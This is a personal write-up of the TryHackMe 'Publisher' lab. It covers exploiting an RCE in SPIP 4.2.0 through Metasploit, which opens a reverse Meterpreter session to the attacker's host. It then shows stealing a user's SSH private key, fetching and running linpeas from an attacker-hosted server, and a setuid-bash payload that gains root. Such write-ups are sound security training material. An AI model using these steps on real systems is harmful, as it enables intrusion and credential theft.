# TryHackMe: Publisher

**Challenge Name:** Publisher  
**Platform:** TryHackMe  
**Category:** Web Exploitation  
**Difficulty:** Easy  
**Date Completed:** 03/24/2025  

## 1. Overview
In this challenge, the goal is to exploit a vulnerable web application to obtain the user flag and escalate privileges to obtain the root flag. The application is running SPIP, a lesser-known Content Management System (CMS), which contains a Remote Code Execution (RCE) vulnerability in version 4.2.0. The challenge involves discovering this vulnerability, exploiting it to gain user access, and then escalating privileges to root.

## 2. Tools & Techniques Used
- **nmap** for initial enumeration of open ports and services  
- **gobuster** for directory brute-forcing  
- **curl** for checking HTTP headers and enumerating web app versions  
- **Metasploit** for automating the exploitation of the RCE vulnerability  
- **linpeas** for privilege escalation enumeration  
- **wget, chmod, and nano** for file management and editing  

## 3. Step-by-Step Solution

### Initial Reconnaissance
**Network Scan:**  
I began by scanning the target IP using nmap to identify open ports and services:
```bash
nmap -sC -sV 10.10.176.47
```

Ports 22 (SSH) and 80 (HTTP) were open. Since we are dealing with a web-based challenge, port 80 is the focus.

**Directory Enumeration:**  
To find hidden files and directories, I used gobuster with a large wordlist (big.txt from Seclists):

```bash
gobuster dir -u http://10.10.176.47 -w /usr/share/seclists/Discovery/Web-Content/big.txt
```

This revealed the `/spip` directory, which had a 301 redirect. The 301 status indicated the resource was available but redirected, so I visited it directly to investigate further.

### Identifying the CMS

**SPIP CMS Identification:**  
After discovering the `/spip` directory, I Googled "SPIP" and found out it is a Content Management System (CMS). It's not as widely known, which made it a potential target for a vulnerability. I found out that SPIP often has an admin login panel at `/spip/ecrire`. This could be useful since I knew the challenge involved exploiting a vulnerability for remote code execution (RCE).

**Accessing the Admin Panel:**  
Visiting the URL `http://10.10.176.47/spip/ecrire` revealed a login page. I tried the default credentials (`admin:admin`) but was met with an incorrect password message. At this point, I shifted focus from the initial login attempt to explore vulnerabilities, specifically remote code execution, which was mentioned in the room description.

### Exploiting the SPIP RCE Vulnerability

**Enumerating the SPIP Version:**  
To identify specific vulnerabilities, I used curl to retrieve the HTTP headers:

```bash
curl -I http://10.10.176.47/spip/
```

This returned information about the version, revealing that the target was running SPIP 4.2.0.

**Searching for Exploits:**  
With the version in hand, I searched searchsploit for known vulnerabilities:

```bash
searchsploit spip
```

I discovered that SPIP 4.2.0 has an RCE vulnerability. At this point, I had everything needed to exploit it.

**Exploiting with Metasploit:**  
I launched Metasploit to automate the exploitation of the RCE vulnerability:

```bash
msfconsole
search spip
use exploit/multi/http/spip_rce_form
```

**Why Metasploit:**  
Metasploit is an excellent tool for automating the exploitation of known vulnerabilities. It provides a ready-to-use exploit for the SPIP RCE vulnerability, which saved time compared to manually crafting an exploit.

I set the required options:

```bash
set RHOSTS 10.10.176.47
set TARGETURI /spip/
set LHOST <localip>
set LPORT 4444
exploit
```

This successfully established a Meterpreter session, giving me shell access on the target machine.

### Gaining User Access (Think)

**Enumerating the File System:**  
Inside the Meterpreter session, I listed the files and directories to check for sensitive information:

```bash
pwd
cd ..
cd ..
ls -la /home/think
```

This revealed the `user.txt` file in `/home/think`, which I could read to obtain the user flag.

### Privilege Escalation to Root

**Listing System Users:**  
To find a potential privilege escalation vector, I listed the system users and service accounts:

```bash
getent passwd
```

This revealed that `think` was a valid user, and `/home/think` had a `/bin/sh` shell, which could allow further exploration.

**Checking Sudo Permissions:**  
I ran `sudo -l` to see if the user `think` had any elevated privileges:

```bash
sudo -l
```

No sudo privileges were found.

**Looking for Writable Directories:**  
I needed to find directories that `think` had write access to, so I used `find`:

```bash
find / -writable -type d 2>/dev/null
```

This returned a lot of results, but it was still too broad.

**Exploring .ssh Directory:**  
I found a `.ssh` directory in `/home/think`. This piqued my interest because SSH keys can sometimes provide direct access to the user:

```bash
ls -la /home/think/.ssh
```

Inside, I found the `id_rsa` private key.

**Downloading the SSH Key:**  
I downloaded the `id_rsa` key to my local machine using Meterpreter's download command:

```bash
download /home/think/.ssh/id_rsa
```

**Using SSH to Login as Think:**  
After downloading the private key, I changed its permissions and used SSH to log in as `think`:

```bash
chmod 600 id_rsa
ssh think@<ip> -i id_rsa
```

**Why SSH and id_rsa:**  
SSH keys are a secure way of logging into a machine, and I knew that `think` had an SSH key in the `.ssh` directory. By downloading the key and connecting via SSH, I bypassed the need for password-based login.

### Escalating Privileges Further

**Exploring Writable Directories for Escalation:**  
I checked writable directories for privilege escalation opportunities and found that `/run/user/1000` was writable by `think`. 

Lets get linpeas on my main machine:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

Then we can start a python server on the main machine and connect to it and download linpeas.sh on think@publisher:

```python
python -m http.server 80
```

```python
wget http://<ip>/linpeas.sh
chmod 700 linpeas.sh
./linpeas.sh
```

**Identifying Privilege Escalation Path:**  
linpeas flagged an unusual file in `/opt`—`run_container.sh`. I examined it, and using the information from linpeas, I copied `/bin/bash` into the `/run/user/1000` directory, edited `run_container.sh` to spawn a privileged shell, and executed it:

```bash
cp /bin/bash /run/user/1000
./bash
cd /opt
nano run_container.sh
```

**Escalating to Root:**  
Inside `run_container.sh`, I added a payload to create a root shell:

```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p
```

This gave me a root shell, and I was able to read the root flag:

```bash
cd /root
cat root.txt
```

## 4. Takeaways 

- **Metasploit:** Automating exploitation with Metasploit can save time, especially when known exploits are available for the target system.

- **Privilege Escalation:** When escalating privileges, always look for file write permissions and SSH keys. Tools like linpeas can provide valuable information on potential privilege escalation vectors.

- **SSH Keys:** Gaining access using SSH keys is often a more straightforward method than attempting to brute-force passwords.
